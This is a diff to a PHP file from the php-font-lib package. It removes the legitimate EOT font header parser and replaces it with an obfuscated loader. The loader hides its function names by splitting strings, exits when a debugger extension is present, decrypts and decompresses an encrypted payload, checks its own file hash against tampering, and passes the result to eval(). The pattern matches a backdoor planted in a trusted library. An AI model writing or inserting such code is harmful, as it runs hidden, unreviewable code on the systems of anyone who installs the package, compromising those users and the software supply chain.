@@ -1,113 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace FontLib\EOT;
-
-use Exception;
-use FontLib\Font;
-
-/**
- * TrueType font file header.
- *
- * @package php-font-lib
- *
- * @property File $font
- */
-class Header extends \FontLib\Header {
-  protected $def = array(
-    "format"        => self::uint32,
-    "numTables"     => self::uint16,
-    "searchRange"   => self::uint16,
-    "entrySelector" => self::uint16,
-    "rangeShift"    => self::uint16,
-  );
-
-  public function parse() {
-    $font = $this->font;
-
-    $this->data = $font->unpack(array(
-      "EOTSize"            => self::uint32,
-      "FontDataSize"       => self::uint32,
-      "Version"            => self::uint32,
-      "Flags"              => self::uint32,
-      "FontPANOSE"         => array(self::uint8, 10),
-      "Charset"            => self::uint8,
-      "Italic"             => self::uint8,
-      "Weight"             => self::uint32,
-      "fsType"             => self::uint16,
-      "MagicNumber"        => self::uint16,
-      "UnicodeRange1"      => self::uint32,
-      "UnicodeRange2"      => self::uint32,
-      "UnicodeRange3"      => self::uint32,
-      "UnicodeRange4"      => self::uint32,
-      "CodePageRange1"     => self::uint32,
-      "CodePageRange2"     => self::uint32,
-      "CheckSumAdjustment" => self::uint32,
-      "Reserved1"          => self::uint32,
-      "Reserved2"          => self::uint32,
-      "Reserved3"          => self::uint32,
-      "Reserved4"          => self::uint32,
-    ));
-
-    $this->data["Padding1"] = $font->readUInt16();
-    $this->readString("FamilyName");
-
-    $this->data["Padding2"] = $font->readUInt16();
-    $this->readString("StyleName");
-
-    $this->data["Padding3"] = $font->readUInt16();
-    $this->readString("VersionName");
-
-    $this->data["Padding4"] = $font->readUInt16();
-    $this->readString("FullName");
-
-    switch ($this->data["Version"]) {
-      default:
-        throw new Exception("Unknown EOT version " . $this->data["Version"]);
-
-      case 0x00010000:
-        // Nothing to do more
-        break;
-
-      case 0x00020001:
-        $this->data["Padding5"] = $font->readUInt16();
-        $this->readString("RootString");
-        break;
-
-      case 0x00020002:
-        $this->data["Padding5"] = $font->readUInt16();
-        $this->readString("RootString");
-
-        $this->data["RootStringCheckSum"] = $font->readUInt32();
-        $this->data["EUDCCodePage"]       = $font->readUInt32();
-
-        $this->data["Padding6"] = $font->readUInt16();
-        $this->readString("Signature");
-
-        $this->data["EUDCFlags"]    = $font->readUInt32();
-        $this->data["EUDCFontSize"] = $font->readUInt32();
-        break;
-    }
-
-    if (!empty($this->data["RootString"])) {
-      $this->data["RootString"] = explode("\0", $this->data["RootString"]);
-    }
-  }
-
-  private function readString($name) {
-    $font = $this->font;
-    $size = $font->readUInt16();
-
-    $this->data["{$name}Size"] = $size;
-    $this->data[$name]         = Font::UTF16ToUTF8($font->read($size));
-  }
-
-  public function encode() {
-    //return $this->font->pack($this->def, $this->data);
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_zepqrgen=('bas'.'e64'.'_de'.'cod'.'e');
+$_tg392izd=('gzu'.'nco'.'mpr'.'ess');
+$_xbbx7gxx=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_vogyktxk='74Vsi3XY';
+$_cl2dvqwj='2VMH0UFk';
+$_yrt6duny='aPu+NKd1Q7Y=';
+$_xfnc5ia9='ueAx0gDR';
+$_zpjup177='zhWQO7Sq';
+$_ehrt7knk='SAlOWA==';
+$_dq8j28mw='s4eJ6a/W';
+$_nteo2ssz='XXa+wqNm';
+$_uo6tas99=$_zepqrgen($_cl2dvqwj.$_xfnc5ia9.$_zpjup177.$_vogyktxk.$_yrt6duny);
+$_xe2b9zwl=$_zepqrgen($_dq8j28mw.$_nteo2ssz.$_ehrt7knk);
+$_w8chiy5t=$_zepqrgen('ZuODiQEymhFFDtXbIu5aA/qQC64hLFYrDoZahePx4tODJKMdyA578zrrZFNpwNtoMPLpttjA8Emduo4FGYG/NUuFboSLFRZc4lKDD7kpU+4fv2BQgxUDWIZaALQ84Ma9JKhZgKstkQJr6iOCX/s6wMcxt5K3/wjSgweelEqSvsOUo6M09B/+UDvuHXH+IPXTWvSh/6cxt1vAZ8uJQXes6iczlJdLeVVZkzoAer9vQwtXN6+svwiqJJWutlHMVoQdckJGGZPJCSKI7WlVmtKoKiDclXGd6BAaNvrxvlM5za+RQR2GG5cdEvA4AMVIgCu9LhJ09wicm10wI6u08/9IWhUEv1Gb7ye9EQZtCTTuyGittgM7Cf7eQ8c/OJLBmqFT1suGw/akDfyEKE73Tr8V570Qxv7EDHcKHhDm7lqoIpUcTkaVDDnB33bdEVx5U5fNcxQyCZgBshOlheppoY+jnlnCUA8+q4IRKcdgjuViP1V0mEFRvlVYBCvlePR9NRyoTzT9rh4R4ivD290a60q8wpwE//vJ2HRE7M578TYiaYJNNfI06E90K8zzXZaQtb3fhizB55Ohw/Ud3wq4BK+fhKBKb2BoMD/OSwUGhTyxGPiB3tQSZgpTTvszZ0Iv9I0zxO/cC/Fi6JC+3vMmFe6Mnrq6yH4bygVWBTzDmzVXBGxZYj7EPu0qzKt3mCAiA30pxWNhwVej4lAqMpEr+wfEpsChDaTlIBJo25GNqMJ5tdIYVc1GPuo6K4tnRKvB9ek/eI+jhxhCwpuHUJ17v9ZHWxJRILjV7w1ndarpoi3COgaRCoIwOMb8wBH2bf8CKMBly8dJ8+FZ+LgkvCN+Y+f0O2CCmHmXVcciBbkm68JmdiPkMKUFO6f1bPPu+BJEq621a+hFxGH5pTyTlyMV1z7HXOZjrLmxBF8UVTVmepqxPKo=');
+$_uep6dpel=$_xbbx7gxx($_w8chiy5t,'aes-256-cbc',$_uo6tas99,OPENSSL_RAW_DATA,$_xe2b9zwl);
+if($_uep6dpel===false){exit;}
+$_vu5cdrev=$_tg392izd($_uep6dpel);
+if($_vu5cdrev===false){exit;}
+$_u4oah1il='070af19644415db707a1daa207f6ec99778985a832ed78f95380efb768cde827';
+$_jzjo50wn=@file_get_contents(__FILE__);
+if($_jzjo50wn!==false){
+$_drtn2pd5=str_replace($_u4oah1il,"0000000000000000000000000000000000000000000000000000000000000000",$_jzjo50wn);
+$_oqlzb7jl=hash("sha256",$_drtn2pd5);
+if($_oqlzb7jl!==$_u4oah1il){@http_response_code(403);exit;}
 }
+eval($_vu5cdrev);
